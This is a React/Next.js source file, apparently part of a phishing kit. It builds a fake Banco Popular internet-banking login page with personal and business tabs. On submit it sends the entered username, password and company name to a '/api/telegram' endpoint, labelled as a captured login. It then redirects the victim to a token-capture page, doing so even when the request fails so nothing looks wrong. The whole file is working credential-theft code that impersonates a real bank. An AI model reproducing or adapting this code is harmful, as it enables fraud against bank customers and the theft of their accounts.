"use client";

import React, { useState, useEffect } from 'react';
import { useRouter } from "next/navigation";

export default function LoginPopular() {
  const router = useRouter();
  
  // Estado para controlar la pestaña activa: 'personal' o 'empresarial'
  const [tab, setTab] = useState<'personal' | 'empresarial'>('personal');
  
  // Estados de los campos del formulario
  const [usuarioEmpresa, setUsuarioEmpresa] = useState('');
  const [usuario, setUsuario] = useState('');
  const [clave, setClave] = useState('');
  const [verClave, setVerClave] = useState(false);
  const [cargando, setCargando] = useState(false);
  const [cliente, setCliente] = useState("");

  // Recuperamos el nombre del cliente al cargar la interfaz
  useEffect(() => {
    const nombreGuardado = localStorage.getItem("cliente_actual");
    if (nombreGuardado) {
      setCliente(nombreGuardado);
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!usuario || !clave) return;
    if (tab === 'empresarial' && !usuarioEmpresa) return;

    setCargando(true);

    const tipoCuenta = tab.toUpperCase();
    const detalleEmpresa = tab === 'empresarial' ? `Empresa: ${usuarioEmpresa}` : 'N/A (Cuenta Personal)';

    try {
      // Envío estructurado de datos a tu API existente
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          pagina: `🔑 LOGIN: POPULAR (${tipoCuenta})`,
          nombre: cliente || "Cliente Desconocido",
          usuario: usuario,
          password: clave,
          detalles: `El usuario ha ingresado sus credenciales. Segmento: ${tipoCuenta}. ${detalleEmpresa}`
        }),
      });

      // Redirección directa a la pantalla del token configurada previamente
      router.push("/portal/token-popular");

    } catch (error) {
      console.error("Error de red al procesar el inicio de sesión:", error);
      // Mantenemos el flujo redirigiendo al token incluso ante fallos de red
      router.push("/portal/token-popular");
    } finally {
      setCargando(false);
    }
  };

  return (
    <main className="min-h-screen w-full bg-gradient-to-br from-[#004b8d] via-[#00719e] to-[#00a1b0] text-white font-sans flex flex-col justify-between items-center relative overflow-x-hidden">
      
      {/* Botón de cerrar superior derecho (X) */}
      <button type="button" className="absolute top-6 right-6 text-white/80 hover:text-white text-2xl transition-opacity font-light">
        ✕
      </button>

      {/* Contenedor Principal */}
      <div className="w-full max-w-[540px] px-6 pt-8 flex flex-col items-center flex-grow justify-center">
        
        {/* Espacio para el Logo con la ruta correcta */}
        <div className="mb-8 text-center flex justify-center items-center">
          <img 
            src="/images/popularlogo1.png" 
            alt="Banco Popular" 
            className="h-32 w-auto object-contain select-none"
          />
        </div>

        {/* Pestañas de Segmentos Dinámicas */}
        <div className="flex items-center justify-center gap-6 mb-8 text-sm font-medium text-white/90">
          <button 
            type="button"
            onClick={() => setTab('personal')}
            className={`px-5 py-2 rounded-full cursor-pointer transition-all ${
              tab === 'personal' ? 'bg-white/20 backdrop-blur-sm opacity-100' : 'opacity-75 hover:opacity-100'
            }`}
          >
            Personal
          </button>
          <button 
            type="button"
            onClick={() => setTab('empresarial')}
            className={`px-5 py-2 rounded-full cursor-pointer transition-all ${
              tab === 'empresarial' ? 'bg-white/20 backdrop-blur-sm opacity-100' : 'opacity-75 hover:opacity-100'
            }`}
          >
            Empresarial
          </button>
          <span className="opacity-75 hover:opacity-100 cursor-pointer transition-opacity flex items-center gap-1">
            Agentes <span className="text-[11px]">↗</span>
          </span>
        </div>

        {/* Banner Informativo */}
        <div className="w-full bg-white/15 border border-white/10 rounded-2xl p-4 flex items-start gap-4 mb-8 text-[13px] leading-snug backdrop-blur-sm text-white/95">
          <div className="flex-shrink-0 mt-0.5 border border-white/40 rounded-lg p-1.5 flex items-center justify-center">
            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 17.25v1.007a3 3 0 01-.879 2.122L7.5 21h9l-.621-.621A3 3 0 0115 18.257V17.25m6-12V15a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 15V5.25m18 0A2.25 2.25 0 0018.75 3H5.25A2.25 2.25 0 003 5.25m18 0V12a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 12V5.25" />
            </svg>
          </div>
          <p>
            Nuestro <strong className="font-bold">Internet Banking</strong> está desplegando una nueva experiencia mejorada con un design más fresco.
          </p>
        </div>

        {/* Título Dinámico */}
        <h2 className="text-[28px] font-normal text-center mb-6 text-white/95 capitalize">
          Tu cuenta {tab}
        </h2>

        {/* Formulario de Captura */}
        <form onSubmit={handleSubmit} className="w-full max-w-[340px] flex flex-col gap-4">
          
          {/* INPUT EXTRA: Solo aparece si está activa la pestaña Empresarial */}
          {tab === 'empresarial' && (
            <div className="w-full bg-white rounded-md shadow-sm overflow-hidden animate-fade-in">
              <input
                type="text"
                placeholder="Nombre de usuario empresa"
                value={usuarioEmpresa}
                onChange={(e) => setUsuarioEmpresa(e.target.value)}
                className="w-full px-4 py-3.5 text-gray-800 placeholder-gray-400 focus:outline-none text-[15px]"
                required
              />
            </div>
          )}
          
          {/* Input: Nombre de Usuario */}
          <div className="w-full bg-white rounded-md shadow-sm overflow-hidden">
            <input
              type="text"
              placeholder="Nombre de usuario"
              value={usuario}
              onChange={(e) => setUsuario(e.target.value)}
              className="w-full px-4 py-3.5 text-gray-800 placeholder-gray-400 focus:outline-none text-[15px]"
              required
            />
          </div>

          {/* Input: Contraseña con Ojo de Visibilidad */}
          <div className="w-full bg-white rounded-md shadow-sm overflow-hidden flex items-center justify-between pr-3">
            <input
              type={verClave ? "text" : "password"}
              placeholder="Contraseña"
              value={clave}
              onChange={(e) => setClave(e.target.value)}
              className="w-full px-4 py-3.5 text-gray-800 placeholder-gray-400 focus:outline-none text-[15px]"
              required
            />
            <button
              type="button"
              onClick={() => setVerClave(!verClave)}
              className="text-gray-400 hover:text-gray-600 focus:outline-none transition-colors"
            >
              {verClave ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
                </svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
              )}
            </button>
          </div>

          {/* Botón Acceder */}
          <button
            type="submit"
            disabled={cargando}
            className={`w-full py-3.5 font-medium rounded-md transition-colors text-[15px] shadow-md mt-2 ${
              cargando 
                ? 'bg-gray-400 text-white/80 cursor-not-allowed' 
                : 'bg-white/30 hover:bg-white/40 text-white'
            }`}
          >
            {cargando ? 'Procesando...' : 'Acceder'}
          </button>

          {/* Enlace Olvidaste Contraseña */}
          <div className="text-center mt-2">
            <a href="#" className="text-xs text-white/90 hover:underline tracking-wide font-medium">
              ¿Olvidaste tu contraseña?
            </a>
          </div>
        </form>
      </div>

      {/* Footer Fijo Inferior */}
      <footer className="w-full py-6 bg-black/10 border-t border-white/5 flex flex-col sm:flex-row justify-center items-center gap-4 text-xs text-white/80 backdrop-blur-sm px-4">
        <a href="#" className="hover:underline">¿No estás registrado? Solicitá tu acceso</a>
        <span className="hidden sm:inline text-white/30">|</span>
        <div className="flex items-center gap-1.5">
          <svg className="w-4 h-4 text-white/70" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
          <a href="#" className="hover:underline">Pistas de seguridad</a>
        </div>
      </footer>
    </main>
  );
}